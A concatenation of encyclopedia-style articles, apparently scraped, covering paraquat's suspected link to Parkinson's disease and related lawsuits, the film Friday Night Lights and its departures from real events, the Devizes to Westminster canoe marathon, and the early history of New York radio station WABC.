In the UK, the use of paraquat was banned in 2007, but the manufacture and export of the herbicide is still permitted. In April 2022, the BBC reported that some UK farmers had called for a ban on British production of paraquat, and stated that &quot;There is no scientific consensus and many conflicting studies on any possible association between Paraquat and Parkinson&#x27;s&quot;. In the US, a class action lawsuit against Syngenta is ongoing; the company rejects the claims but has paid £187.5 million into a settlement fund. As of August 2024, more than 5,700 cases against Syngenta (manufacturer of Gramoxone) and Chevron (the former distributor) are pending in the paraquat multidistrict litigation in the US; the first of 10 bellwether trials will start in 2024.

In August 2024, the British Columbia Supreme Court certified a class-action lawsuit against Syngenta on behalf of at least two plaintiffs who were diagnosed with Parkinson&#x27;s after exposure to paraquat.

According to the NIEHS, pesticide exposure has consistently been associated with the onset of Parkinson&#x27;s disease.
* A 17-year long, NIEHS-funded study of the links between Parkinson&#x27;s disease, environment, and genes shows that some pesticides, including paraquat, maneb, ziram, benomyl, and several organophosphate pesticides, including diazinon and chlorpyrifos, contribute to Parkinson&#x27;s disease onset and progression.
* People with Parkinson&#x27;s disease who are exposed to a high level of ten different active ingredients in agricultural pesticides may see their motor and non-motor symptoms progress faster compared with those who are not, a 2022 study found.
* Other NIEHS research found that people who occupationally used two pesticides, rotenone or paraquat, developed Parkinson&#x27;s disease 2.5 times more often than non-users.
* In addition, people exposed to pesticides in the home or garden may face a greater chance of developing Parkinson&#x27;s disease.
* Pesticides may directly or indirectly disrupt the biological pathways that normally protect dopaminergic neurons, the brain cells selectively attacked by the disease.
* Some pesticides, like rotenone, can directly block the function of mitochondria, the structures that create energy to run the cell. NIEHS researchers showed in mice that disrupting mitochondria through exposure to rotenone early in development changed the epigenome—the chemical tags that turn genes on and off—in ways that persisted throughout life.
* Other pesticides, like paraquat, have been found to increase production of free radicals that can damage cells.
Some people are more vulnerable to the harmful effects of pesticides because of their age or genetic makeup.
* Many studies identified genetic variations that provide insight into why certain people appear to be at higher risk of developing Parkinson&#x27;s.
* Using data from a NIEHS-conducted agricultural health study, researchers found that Parkinson&#x27;s risk from paraquat use was particularly high in people with a particular variant of a gene known as GSTT1.
* Similarly, other research has indicated that people with lower levels of the PON1 gene, which is important for the metabolism of organophosphate pesticides, showed faster progression of the disease.
Further research into links between preventable exposures and Parkinson&#x27;s disease, as well as preventative therapies, could help reduce the incidence of the disease. For example, using protective gloves and other hygiene practices reduced the risk of Parkinson&#x27;s disease among farmers using paraquat, permethrin, and trifluralin.

<text>Friday Night Lights is a 2004 American sports drama film co-written and directed by Peter Berg. The film follows the coach and players of a high school football team in the Texas city of Odessa. The book on which it is based, &quot;Friday Night Lights: A Town, a Team, and a Dream&quot; (1990) by H. G. Bissinger, followed the story of the 1988 Permian High School Panthers football team as they made a run towards the state championship. A television series of the same name premiered on October 3, 2006, on NBC. The film won the Best Sports Movie ESPY Award and was ranked number 37 on &quot;Entertainment Weekly&quot; list of the Best High School Movies.

==Plot==
As preseason practice begins for the Permian High School football team in August 1988, the town of Odessa, Texas, has high expectations for the players and their coach Gary Gaines to win a state championship with their star running back James &quot;Boobie&quot; Miles. The quarterback, Mike Winchell, runs under the expectation of handing off the ball to Miles on most plays. Fullback Don Billingsley struggles with his ball handling and is abused by his alcoholic father, Charles, who won a state championship with Permian. The players frequently party as they deal with the pressures of Odessa&#x27;s expectations.

In the season opener against the Marshall Bulldogs, the Permian Panthers make the game a blowout. Gaines intends to bench Miles in the waning minutes but keeps him in after third-stringer Chris Comer misplaces his helmet, making him unprepared to go in. Miles is sent in but severely tears his ACL after being tackled at the knee on the ensuing play. After the incident, Gaines endures intense public backlash from the town for keeping Miles in. In the next game, at the start of district play, Permian gets blown out as Winchell struggles with consistency in his increased role. However, after the Panthers fall behind by 14 in the next game, Comer comes into the game after the second-string running back gets injured and helps Winchell and Billingsley get Permian&#x27;s offense rolling again, leading them to a comeback win. Despite their small size, Permian&#x27;s defense proves to be stout under the leadership of safety Brian Chavez and linebacker Ivory Christian, and the Panthers embark on a five-game winning streak.

Miles holds out hope that he can return to playing soon. Unfortunately, his MRI scan shows that he needs immediate knee surgery and cannot play for the rest of the season. Miles boldly denies the severity of his knee injury and lies to Gaines so he can suit up again, with his uncle and legal guardian L.V. advocating for him. Permian plays its final district game against Midland Lee with first place and a playoff berth on the line. The Panthers fall behind, and Gaines puts Miles in out of desperation, but Miles is soon injured again. Winchell leads a comeback drive, but Permian ultimately loses as his final pass flies over the receiver&#x27;s hands. After the game, Billingsley fights with his drunk father, who throws his state championship ring onto the side of the freeway. The following day, Don reveals to his father that he recovered the championship ring and gives it back to him. Charles partially apologizes and makes the point that his state championship was the best thing that happened to him, and he now has nothing happy except those memories. The loss puts Permian in a three-way tie for first place with Lee and Abilene Cooper, and a coin toss is held to determine which two teams make the playoffs. Permian and Lee win the toss, and Miles clears his locker as the Panthers prepare for the playoffs. While in his uncle&#x27;s car, he cries about his future being bleak now that his promising football career has ended.

Permian is successful in the playoffs, but all eyes are on the state powerhouse Dallas Carter High School. Permian and Carter make it to the state championship game, which is held at the Astrodome as a neutral site. Miles rejoins the team and watches from the sidelines as the Panthers head into the game. They are initially overwhelmed by Carter&#x27;s superior size and fall behind, although an interception by Christian helps get them on the board before halftime. In the second half, Carter gains a 20-point lead after a pass on fourth down, which hit the turf, is erroneously ruled complete. However, Permian&#x27;s defense improves its tackling, and the offense pushes through despite injuries as the Panthers score 14 unanswered points to cut the deficit to six. They stop Carter on fourth and inches, leaving the offense to go 75 yards in less than two minutes for the win. Winchell, Billingsley, and Comer are all injured, but the former two reenter the game. Billingsley takes the ball to the 1-yard line on fourth down, but the play is called back due to a holding penalty. With two seconds left, Winchell desperately runs the ball toward the goal line but is stopped just short, and Carter wins the championship. As the Permian players soak in their defeat, Billingsley reconciles with Charles.

Afterward, Gaines removes the outgoing seniors from his depth chart, and it is revealed that Winchell, Billingsley, Miles, and Chavez went on to have successful lives after their football careers ended, with only Christian earning a Division I scholarship. The film ends with the statement that Gaines and Comer led Permian to an undefeated state championship season the following year.

===Cameos===
*Former NFL wide receiver Roy Williams (a Permian alumnus) had a cameo in the film as an assistant coach for Midland Lee, Permian&#x27;s arch-rival.
*Some sequences during the state playoffs showed highlights from high school football games in Texas. In one of those highlights, NFL Pro Bowl cornerback Aqib Talib can be seen.
* Ty Law played a wide receiver for Dallas Carter, the team Permian played in the film&#x27;s state championship game. He wore jersey #2, his last name was Graf, and he caught a one-handed touchdown pass.
*The real James &quot;Boobie&quot; Miles cameos as a Permian assistant coach in the film. Although he has no lines, he was seen several times. In the locker room scene at halftime of the state championship game, he was seen standing next to the fictional &quot;Boobie&quot; Miles as Coach Gaines gives his speech.
* Bryan Gutierrez was a Team Manager with the 95 State Finalist Team

==Differences between the film and events==
===Players===
*In the film, Boobie Miles was depicted as one of the team&#x27;s three captains, but that honor was held by Ivory Christian, Mike Winchell, and Brian Chavez in real life.
*In the film, some of the players&#x27; numbers and positions were changed: Boobie Miles was #45 and played tailback in the film but in the book he was playing fullback (while Don Billingsley was the tailback) and #35. In the film, Brian Chavez was the #4 strong safety, while he was the #85 tight end in the book, and Ivory Christian was a defensive end and wore #90, while he was the #62 middle (&quot;Mike&quot;) linebacker in the book. At the beginning of the film, as the camera panned over Coach Gaines&#x27; depth chart, &#x27;Miles&#x27; name was listed under the FB tag. Chris Comer was also the backup fullback in the book, not a third-string tailback. One of the athletic directors in the stadium booth said, &quot;I think he&#x27;s a sophomore&quot;, when Comer was a junior at the time. Comer also wore #45 in the real season, but in the film, he wore #42. Alan Wyles was depicted as a wide receiver when he was the placekicker.
*Don Billingsley&#x27;s father Charlie was depicted in the film as having won a state championship. In reality, as a junior, the 1968 Permian team lost in the finals.

===The regular season===
In the film, the team was depicted as practicing in full pads and with full contact on the first day of practice. Under rules of the University Interscholastic League (UIL), the governing body for Texas public school sports, teams cannot use pads or hit until the fourth day of practice (however, in the deleted scenes included in the DVD, a non-pad practice was shown).
*A Permian booster was heard toasting Coach Gaines&#x27; second season as Permian&#x27;s head coach. It was his third.
*Boobie Miles, in the book, injured his knee by getting his foot caught on the AstroTurf during a pre-season scrimmage against Amarillo Palo Duro at Jones Stadium in Lubbock. In the film, he was tackled by two players at the knee during a blowout regular season non-district game at Ratliff Stadium.
*In the film, the top-ranked Permian Panthers defeated the hapless Marshall Bulldogs in a non-district game. In real life, the third-ranked Marshall Mavericks (whose colors are red and white, not purple and gold) defeated fourth-ranked Permian 13–12. In the film, the game was the season opener and played on a Friday night in Odessa. In real life, it was Permian&#x27;s second game of the season and played at Maverick Stadium in Marshall on a Saturday afternoon. Permian&#x27;s football team chartered a jet for the 500+ mile trip from Odessa to Marshall, spawning controversy on the cost of the trip. Played before a crowd of more than 12,000 fans at Maverick Stadium, the game was on a searing September afternoon when the temperature topped 100 degrees Fahrenheit (38 °C). The footage shown in the film was from a game against the Midland High Bulldogs, who weren&#x27;t mentioned in the film. Permian defeated the Dawgs 42–0 in district play, but the two teams ended up in a three-way tie along with Midland Lee for the district title.
*In the film, district play began in week 2. In the real regular season, district play began in week 4.
*In the film, Permian defeated &quot;North Shore Galena&quot; in a mid-season (presumably district) game. In reality, North Shore High School was within the Galena Park Independent School District located in the Houston suburbs over 500 miles (800 km) southeast of Odessa. Although North Shore and Permian have both been 5A football powerhouses, they have never played. Furthermore, North Shore did not start seeing football success until the mid-1990s.
*In reality, the three teams tied for best district record were Permian, Midland Lee, and Midland High, all with 5-1 district records. In the film, Permian and Lee were joined not by Midland but by Abilene Cooper, and each team had two district losses. The tie-breaking coin flip was held at a truck stop outside of Midland, and Midland High lost (Cooper in the film), so Permian and Lee went on. Midland High&#x27;s missing the playoffs was poignant as it had not been to the playoffs since 1951 and did not get back to post-season play until 2002.
*A Permian player (Mike Winchell) was shown with coach Gaines at the coin toss. In reality, no players from any of the three schools were allowed at the coin toss. All of Permian&#x27;s players were on the team bus returning from the game that evening at San Angelo Central. Permian assistant coach Mike Belew drove with Gaines from San Angelo to the site of the coin toss.
*In a few scenes, players were shown wearing Under Armour apparel and facemask shields, although in 1988, Under Armour and visors hadn&#x27;t been invented yet. (Under Armour founder Kevin Plank was in high school in 1988.) The book says they wore green visors, which are now outlawed for high school and college teams.
*In the film, the quarterback for Midland Lee was shown wearing a Riddell Revolution-style football helmet. The brand, Riddell, had been around since 1929, but the design didn&#x27;t appear until 2002.
*In the film, the annual duel against Permian&#x27;s archrival Midland Lee was portrayed as Lee having a handy lead throughout the game, with Permian never having a shot at victory. In real life, Lee had to come from behind with a late-game touchdown to win the game 22–21.

===The playoffs===
*Permian&#x27;s first opponent in the playoffs was Amarillo Tascosa and not Dallas Jesuit as in the film. In 1988, Texas Public Schools (such as Permian, Carter, and Tascosa) and private schools (such as Jesuit) competed in separate leagues with separate playoffs. Jesuit was not allowed to join the previously all-public school UIL until 2003, starting football competition in 2004. Dallas Jesuit and Strake Jesuit of Houston were the only private schools who currently play in the UIL, the rest competing in leagues such as TAPPS and the SPC. Also, with the district set up at that time, it would have been impossible for Permian to play a team from the Dallas/Fort Worth Metroplex until the third round of the playoffs. Nowadays, Permian could play Fort Worth-area teams in the first round of the playoffs, but still could not play Jesuit until round 3. Permian played Dallas Jesuit in Odessa during the regular season in 1988, winning 48–2. Jesuit&#x27;s only points came on a missed-PAT return, which was a rule instituted that year (the defensive conversion was not allowed in high school football under National Federation of State High School Associations rules, but Texas plays by NCAA rules). Jesuit&#x27;s helmet was shown as white and orange with a sort of wildcat&#x27;s head logo on it, but in real life, they are solid gold without a logo.
*In the film, it was said that Carter was the state&#x27;s top-ranked team when Carter was never ranked higher than No. 3 in the Associated Press poll.
*Carter played &quot;Hays&quot; High School in the playoffs, which was depicted as wearing green and white and nicknamed the Rams. The real Jack C. Hays High School, located 15 minutes south of Austin in Buda, used red, white, and blue as its colors, and their nickname was the Rebels. Hays was a Class 4A school in 1988 and did not become 5A until 2000. Hays was in the film because the makers filmed crowd shots at Hays High during a Rebels home game against the Austin Westlake Chaparrals, another team depicted as a Permian playoff victim.
*Permian was depicted as playing &quot;San Angelo&quot; in the quarterfinal round. There were two high schools in the San Angelo Independent School District; until 1998, San Angelo Central High School, the district&#x27;s only 5A school had been in the same district as Permian (having since been transferred, for football only, to the district with Lubbock and Amarillo schools), and could only have played Permian in the quarterfinal round (owing to the structure of UIL playoffs) if they had qualified. However, Central finished 5th in the district that year, and as only two teams from each district qualified in 1988, Permian and Central did not play in the 1988 playoffs. Instead, Permian played Arlington Lamar in the quarterfinals.
*On the playoff brackets it shows just the word &quot;Baytown&quot;. There were two high schools in Baytown in 1988 (there are now three), the team in the playoffs was Baytown Lee.

===Permian vs. Carter===
*Since 1982, the UIL Class 5A (now 6A) football playoffs have had six rounds (though a second, parallel playoff bracket of five rounds was added in 1990, later also expanded to six rounds in 2006), so while Permian played Dallas Carter in the fifth round, it was a semi-final and not a final. In the Texas playoffs, a team from North or Western Texas always plays a team from the Houston area or Southern Texas in the final, so the Carter vs Permian final was not possible. The real-life final featured Carter versus Converse Judson (which defeated Permian in the 1995 state championship). The Carter-Permian game was played in front of 10,000 people in a heavy downpour at The University of Texas at Austin&#x27;s Memorial Stadium, not in front of 55,000 in the Astrodome in Houston. While the game in the film was a high-scoring affair (34-28), the real score was 14–9 in favor of Carter. In real life, Permian held a 9–7 lead for most of the game and Carter made the dramatic fourth-quarter comeback to win. On the last play of the game, Winchell threw the ball incomplete, rather than running it himself close to the goal line.
*The meeting between officials from Permian and Carter at the Midland airport occurred the Sunday prior to the game. Not shown in the film was the Carter officials changing their minds about a home site from Texas Stadium in Irving to the Cotton Bowl within the Dallas city limits. Under UIL rules, if the schools cannot agree to a neutral site, each side picks a &quot;home&quot; site and a &quot;neutral&quot; site, and two coin tosses are conducted. The first was to determine whether a &quot;home&quot; or &quot;neutral&quot; site would be used, and the second was to determine which team&#x27;s site will be used. After a tense battle between the sides, they agreed to play the game at Austin. 
*In the film, Gaines at first suggests San Antonio as a potential neutral site, which would have meant playing the game at Alamo Stadium, since the Alamodome did not open until 1993. The other neutral site suggestion in the film was College Station, presumably meaning Kyle Field at Texas A&amp;M. 
*The revocation of Carter&#x27;s state championship following their use of an academically ineligible player was never mentioned, nor was the prolonged legal battle that Carter went through to enable them to play in the playoffs. Officially, the 1988 state champions were Converse Judson, which lost 31–14 in the final to Carter.

===The school and the city===
*Permian was portrayed in the film as a single large high school in a small, one-horse town in West Texas. In reality, Odessa was a city of nearly 100,000 people at the time of the events portrayed in the film, and part of a metropolitan area of nearly 250,000 combining the populations of Midland and Ector counties. (The quaint downtown shown in the trailer for the film was Manhattan, Kansas.) Also, Permian was (and still is) only one of two large Class 5A high schools in Odessa. The other and first high school in the city, Odessa High School (mascot: the Bronchos), was never mentioned in the film, despite the fact that they have played Permian every year, as the two schools have been in the same UIL district since Permian opened in 1959 and shared Ratliff Stadium with Permian. An entire chapter in the book was devoted to the &quot;Civil War&quot; between the schools.
*In the film, Odessa was portrayed as being a mostly Anglo town with a sizable African-American population and virtually no Hispanics. In 1988, out of the almost 100,000 people that lived in Odessa, one-third were Hispanic while African-Americans made up only 5% of the population.
*Ratliff Stadium was depicted as the location for Permian football practices. In reality, the team practiced mostly on campus, and the stadium, used by both Permian and Odessa, was on the outskirts of town in a fairly unpopulated area about three miles (five km) away from the Permian High campus. It was also unlikely that children would be playing touch football near the stadium, as depicted in the film, as few houses were nearby at that time. The area around the stadium has grown dramatically since then (which caused an unconscious anachronism in the film—the houses seen near the stadium did not yet exist in 1988).
*While Ratliff Stadium has had artificial turf since its opening, in 1988 it had the original AstroTurf, not the modern FieldTurf surface seen on the stadium in the film.

==Soundtrack==

The soundtrack for the film predominantly featured post-rock band Explosions in the Sky. Music by Daniel Lanois and rock band Bad Company were also included. Other songs in the film were &quot;Just Got Paid&quot; by ZZ Top during the montage of the Panthers&#x27; road to the finals; the pump-up song featured as the team ran through the tunnel in the game against Dallas Carter was &quot;New Noise&quot; by the seminal Swedish punk band Refused. During the start of the third quarter during the Championship game, the song &quot;I Wanna Be Your Dog&quot; by The Stooges was used. Three songs from Public Enemy&#x27;s album It Takes a Nation of Millions to Hold Us Back were also used prominently.

==Reception==

===Critical reception===
On Rotten Tomatoes, &quot;Friday Night Lights&quot; has an approval rating of 82% based on 173 reviews, with an average rating of 7.10/10. The consensus reads: &quot;An acute survey of the football-obsessed heartland that succeeds as both a stirring drama and a rousing sports movie.&quot; The film also has a score of 70/100 on Metacritic, based on 35 reviews.

Film critic Roger Ebert awarded the film three and a half out of four stars, writing, &quot;The movie demonstrates the power of sports to involve us; we don&#x27;t live in Odessa and are watching a game played 16 years ago, and we get all wound up.&quot;

Other reviews opined the film seemed to glorify what it was criticizing. Charles Taylor of &quot;Salon&quot; wrote, “...in the second half, the movie turns into a rah-rah celebration of exactly the mindset it&#x27;s spent the first half criticizing. All of the bad things that have resulted from the characters&#x27; mindless devotion to gridiron glory--the abusive father who stays drunk to forget that the peak of his life came at 17; the barely educated Boobie&#x27;s having nothing left in his life when a knee injury ends his dream of playing pro -- are converted into obstacles that test the mettle of the young warriors”. Taylor did praise the acting, particularly the performances of Black, Luke, and Thornton.

Earl Ofari Hutchinson of the &quot;Los Angeles Times&quot; criticized the film for skirting the issue of race relations in Odessa, which Bissinger had gone in depth about in his book. Peter Travers of &quot;Rolling Stone&quot; awarded the film 3 stars but said it did not sufficiently get into the heads of the players like the book did.

While the residents of Odessa held a negative reception of the book due to its account of race relations in the Texas city, they eagerly anticipated the release of the film.

===Accolades===
The film was recognized by American Film Institute in these lists:
* 2004: AFI&#x27;s Top 10 Film of the Year
* 2008: AFI&#x27;s 10 Top 10:

<text>The Devizes to Westminster International Canoe Marathon is a marathon canoe race in England. The race is held every Easter over a course of from Devizes in Wiltshire to Westminster in central London. It has been run since 1948. Starting at Devizes wharf, the route follows the Kennet and Avon canal for 54 miles to Reading, where it joins the Thames. Another 54 miles later it reaches Teddington Lock, ending 17 miles later at Westminster Bridge.

Personalities to own a DW medal include former leader of the Liberal Democrats, Paddy Ashdown; explorer Sir Ranulph Fiennes; TV presenter Steve Backshall; Olympic gold medallist rowers James Cracknell and Helen Glover; adventurer Sarah Outen; and the first British woman to climb Everest, Rebecca Stephens.

==Route==

The race follows the Kennet and Avon Canal for from Devizes through Pewsey, Hungerford and Newbury to Reading. From Reading the race follows the non-tidal River Thames downstream for through Henley-on-Thames, Marlow, Maidenhead, Windsor, Staines and Kingston before reaching the tidal River Thames at Teddington Lock. The tidal river is followed for the final through the western suburbs of London to Westminster. The 2008 race was the 60th anniversary of the event.

The course requires competitors to portage their canoes and kayaks around 77 locks. Starting from Devizes, there are four locks before the Bruce tunnel, and another 31 locks before Newbury wharf, and the end of the first stage, is reached. Stage 2 has 22 locks on the Kennet and Avon Canal, before the junction with the River Thames is reached, and a further six locks on the Thames, before the stage ends above Marlow lock. Stage 3 includes 14 locks, ending below Teddington lock, while stage 4 has a single lock at Richmond before the final on the tideway. Richmond lock is only operational at some states of the tide, and so a portage may be avoided if passage is made during a period of two hours either side of high tide.

==History==
The idea of canoeing from Devizes to Westminster was first suggested by Roy Cooke, who had been part of a team who had attempted to canoe along the River Avon from Pewsey, near Devizes, to the sea at Christchurch in 1947. He then planned to see if it was possible to reach Westminster from Devizes in under 100 hours. At the time, much of the Kennet and Avon Canal was derelict, but still in water. He was unable to attempt the course, but a number of locals offered some money for Scout funds if the Devizes Scouts could succeed in &quot;taking a boat from Devizes to Westminster in under 100 hours, all food and camping kit to be carried in the boats&quot;. Four of the scouts, Peter Brown, Laurie Jones, Brian Smith and Brian Walters, all aged 17, attempted the route at Easter 1948. The event generated much interest, with some national press coverage, and a large crowd gathering at Westminster Bridge to see the end of the feat, which was completed in 89 hours 50 minutes.

Chippenham Sea Cadets attempted the route at Whitsun 1948, and managed to reduce the time to 75 hours 50 minutes, but several attempts later in the year were thwarted by the amount of weed in the canal. In 1949, although no race had been organised, nearly 20 boats attempted the course at Easter, and although many failed to complete it, two crews representing Richmond Canoe Club completed it in 49 hours 32 minutes, and a team from Bristol Scouts managed 53 hours 10 minutes.

In view of the interest shown, Frank Luzmore, one of the competitors from Richmond Canoe Club, decided to organise the event as an annual contest. Albert Weibel, another member of the Richmond Canoe Club, donated a trophy for the winner, and at Easter 1950, 17 boats took part in the first official race. A team from Richmond Canoe Club won again, by completing the course non-stop in 34 hours 52 minutes, closely followed by a team representing the Royal Marines. Ten of the boats completed the course.

The armed forces saw the race as an opportunity for training, and because they organised the backup support as a military exercise, won the race from 1951 until 1970, with the exception of 1952. Teams from the Paras, Royal Marines, SAS and Special Forces competed, with Dansie and Dry, representing the SAS, completing the course in just over 24 hours in 1951. Officially, every boat had to carry cooking equipment, camping equipment and a host of other standard items, and no assistance from a support team was allowed. Even water could only be obtained from official watering points.

As the main race soon became a one-day event, rather than a four-day one, much of the official kit was redundant, and there was widespread breaking of the rules. In 1966, one of the crews who finished the race was disqualified, two crews had time penalties added to the time they actually took, and 49 of the crews who failed to finish were deemed to have broken the rules, and so would have been disqualified if they had finished. The military teams, with their radio networks, were particularly good at offering support, in particular food, to their teams at remote locations, where they were unlikely to be seen by race officials.

Recognising that the military had an unfair advantage, the rules were changed in 1971, so that boats did not have to carry &quot;all food and camping kit&quot;, and the use of support teams to supply food and drink was allowed. Peter Lawler and Chris Baker, both from Richmond Canoe Club, and who had canoed for Britain at international level, took up the challenge, and succeeded in beating Paganelli and Evans, who had won the race for the Paras in 1968, 1969 and 1970.

===Junior and Ladies Classes===
The original rules published in 1950 states &quot;The Cup may be competed for by any canoeing team without restriction of age, its members must be normally resident in the British Isles.&quot; The first crews to complete the course and begin the event were in fact all Juniors. The stage race, started in 1953 was introduced by the first more formal organisation to prevent Junior crews attempting to complete the course non-stop.

Junior teams were originally banned from the race on safety grounds, but the pressure to allow them to compete resulted in the introduction of stages in 1953, originally two, but soon changed to three, with compulsory overnight stops at Newbury, Marlow and Ham, just below Teddington lock. There were two crews in the junior category in 1953, but this had risen to over 50 by 1961, and in 1970 there were 100 junior crews. Numbers after that gradually declined, but a schools trophy was set up in 1975, and school teams now account for most of the junior entries.

Women were barred from the race at first, and it was not until 1971 that Sheila Burnett from Cambridge Canoe Club finished the race with Colin Dickens, only to be disqualified when it was discovered that she was a woman. In 1973, Anne-Marie Evans entered the race under a false name, in partnership with Jonathan Hutt, and was awarded a certificate for finishing, but the official policy was still that women should not enter the race. Even upon awarding them a certificate, the committee stated: &quot;There is not and will not be a women&#x27;s class, since the committee will not encourage women to enter&quot;.

By the late 1970s attitudes had changed. The first all-woman crew of Jo Saxby and Maurene Hossack entered unofficially in 1975. Trophies for ladies and mixed doubles classes were introduced in 1980. In 1995, Danielle Sellwood and Sandra Troop set the women&#x27;s record at 18 hours 47 minutes, and in 1997 Danielle Sellwood was placed third overall, becoming the first woman to hold the civilian trophy. A class for junior ladies was introduced in 1976, and a junior mixed doubles class in 1981.

===Other race developments===
Concerned for the safety of paddlers attempting to run DW non-stop in singles (some successfully, including one by a Hungarian in a racing C1), the committee introduced a singles event in 1986 using the same stage format as the junior race. This event has proved especially popular with foreign competitors as knowledge of the course is not so vital.

A junior / veteran class was introduced in 1989, with the intention of giving parents an opportunity to paddle with their children.

An initiative to the race in the 1980s, introduced by the chairman of the committee Peter Begent, was the formal encouragement of competitors to raise money for charities by being sponsored to complete the race. Now, every year many thousands of pounds are raised by paddlers for numerous charities, and the Pfeiffer Trophy is awarded to the crew raising the largest amount of money.

In 2002, the Endeavour Class was introduced to allow older paddlers who may have participated in the DW earlier in their lives, and also inexperienced beginners, to join DW as a 4-day tour of the course without the stress of racing. This non-competitive class is also free from the restriction of overnight camping within 200 metres of the course, allowing the use of hotel and B&amp;B accommodation.

The 1000 Mile Club was introduced in 2011, an honour recognising the achievements of those who had completed the race eight times.

==Classes==
There are five classes of event, each with its own set of rules.

*Senior Doubles: This is a non-stop race, timed continuously from the moment they start, until either they reach Westminster, or they admit defeat (which accounts for one third of the entries, rising to half in 1998).
*Junior Doubles: Two crew members, completing the course in four stages with overnight stops.
*Junior/Veteran: Two crew members, one who must be a junior, and one who must be over 35, completing the course in four stages with overnight stops. This class was introduced in 1989 to encourage parents to canoe with their children, but most crews which have entered are not related.
*Senior Singles: One person kayaks or canoes, over the same four stages.
*Endeavour: A doubles class held over four stages which is non-competitive.

The stages in the Stages race are as follows:
:Stage 1: Devizes Wharf to Northcroft Leisure Centre, Newbury (34.4 miles)
:Stage 2: Northcroft Leisure Centre, Newbury to Marlow (35.6 miles)
:Stage 3: Marlow to Thames Young Mariners, Teddington (37.5 miles)
:Stage 4: Thames Young Mariners, Teddington to Westminster Bridge (17.5 miles)

==Cancellations and abandoned races==
In 2000, heavy rainfall had brought the River Thames up to flood levels with fast-flowing water. A number of crews found the conditions on the Thames challenging, especially during the darkness of night-time for the non-stop crews. After an incident at Old Windsor weir, the race committee took the decision to abandon the race. As some teams had already reached Teddington (and were waiting to access the tidal stretch) when the decision was made, they decided (against the race organisers&#x27; instructions) to remove their race numbers and carry on unofficially to Westminster.

In 2001, along with a large number of events in the UK, the race could not take place due to a nationwide outbreak of foot-and-mouth disease restricting unnecessary access to the countryside (and thus large parts of the course).

In 2016, Storm Katie brought storm force winds to London on Easter Monday and a decision was made to cancel the last day of the staged race; the results were based on the times taken to reach Thames Young Mariners. Finishers&#x27; medals were awarded to those that reached this point and certificates issued marked &quot;shortened course&quot;. This decision did not affect the non-stop race, which had already finished on Easter Sunday.

In 2018, heavy rainfall prior to the Easter weekend and throughout Good Friday again brought the River Thames up to flood levels with fast-flowing water. The race committee initially ruled that no night-time paddling should occur on the Thames, but after conditions worsened they decided that all classes would finish at Reading (Wokingham Canoe Club at Dreadnought Reach). No finishers&#x27; medals were issued and certificates were marked &quot;shortened course&quot;.

In 2020 and 2021, the event was cancelled because of the COVID-19 pandemic.

In 2022, the event was shortened to 108 miles and finished at Teddington, since the grounds of St Thomas&#x27; Hospital were occupied by a vaccination station.

In 2023, race entries were curtailed due to extremely high water levels. Many crews were disallowed from the start, based on ability, to let organisers focus health and safety efforts on crews who were more likely to be water-competent. Thus, no crew with a junior was allowed to go past Dreadnought Reach in Reading. This was also the case for Senior Singles, Junior Doubles, Junior Vet classes and any Endeavour crew containing a junior. Only Senior Doubles were allowed to finish in Westminster.

In 2024, the organisers intended to have the finish line for the Senior Doubles at its traditional Westminster site, while the Stage Races would span three days and finish at Thames Young Mariners, Ham, opposite Twickenham. These changes arose from concerns over increased powered traffic on the Thames tideway, in particular the high-speed Thames Clippers river bus. In the event, high water levels from Storm Nelson led to parts of the canal overflowing, reaching Richmond. This initiated the Port of London&#x27;s Ebb Tide Red Flag warning. Therefore, the Single K1, Junior/Vet, Endeavour class, and non-stop Senior Doubles races were all terminated at Teddington, and the Junior Doubles race terminated at Dreadnought Reach in Reading. Altogether, these limitations meant no course records attempts could be made.

==Course records==
The current (non-stop) course record was set during an unprecedented race in 2023, which saw half of the senior entrants disallowed by a competency-based assessment for safety reasons. Keith Moule of Chelmsford Canoe Club and Tom Sharpe of Richmond Canoe Club set a new record with a time of 15 hours and 19 minutes. For the previous 44 years the record stood at 15 hours 34 minutes, set in 1979 by Brian Greenham and Tim Cornish, one from Richmond Canoe Club and one from Reading Canoe Club.

For the staged events, the solo record was set in 1993 by G Butler of Nottingham Kayak Club in a time of 14 hours 46 minutes. The junior record was also set in 1993 by the Richmond / Royal pairing of Steve Jensen and Tony Richardson in 14 hours 13 minutes, faster than the senior record, but they did have three night&#x27;s sleep on the way down.

==Related races==

In the months leading up to the races, there are two series of races, the Thameside Series and Waterside Series, that are deemed good practice for crews competing in the main Devizes to Westminster race. The Thameside Series is based around Reading, with two races, going from Aldermaston to Reading and Reading to Marlow respectively. The Waterside Series is a series of four races based around Newbury, Berkshire, of lengths 14 miles, 17.5 miles, 23 miles and 34 miles; it is often competed as a series on its own.

<doc id="1065786" wikidata="Q1322074" url="?curid=1065786" title="WABC (AM)">
<text>WABC (770 AM) is a commercial radio station licensed to New York, New York, carrying a conservative talk radio format known as &quot;Talkradio 77&quot;. Owned by John Catsimatidis&#x27; Red Apple Media, the station&#x27;s studios are located in Red Apple Media headquarters on Third Avenue in Midtown Manhattan and its transmitter is in Lodi, New Jersey. Its 50,000-watt non-directional clear channel signal can be heard at night throughout much of the Eastern United States and Eastern Canada. It is the primary entry point for the Emergency Alert System in the New York metropolitan area and New Jersey. WABC simulcasts on WLIR-FM in Hampton Bays, New York, on eastern Long Island.

Owned and operated by the American Broadcasting Company for much of its history, it is one of the country&#x27;s oldest radio stations. WABC began broadcasting in early October 1921, originally as WJZ in Newark, New Jersey. From 1943 through 2007, the station served as the flagship for the original ABC Radio Network (and its direct predecessor, the Blue Network) and ABC&#x27;s radio news service. While WABC has been a talk radio station since 1982, the station broadcast a Top 40 music format from 1960 to 1982. Starting in the 1960s to 1978, WABC was not only the dominant contemporary music station in New York City, but was also among the most listened-to radio stations in North America, serving as a template for many other Top 40 stations around the country.

==History==
===WJZ Newark (1921–1923)===

In November 1920, the Westinghouse Electric &amp; Manufacturing Company had established its first broadcasting station, KDKA, located in its plant at East Pittsburgh, Pennsylvania, to promote the sale of radio receivers. This initial station proved successful, so the next year the company developed plans to set up additional stations in major population centers, including, in addition to the New York City area, WBZ, originally in Springfield, Massachusetts, and KYW, originally in Chicago, Illinois.

On September 30, 1921, Westinghouse was issued a broadcasting authorization for a station with the randomly assigned call letters WJZ, located at the company&#x27;s meter factory at Orange and Plane streets in Newark, New Jersey, and transmitting on a wavelength of 360 meters (833 kHz).

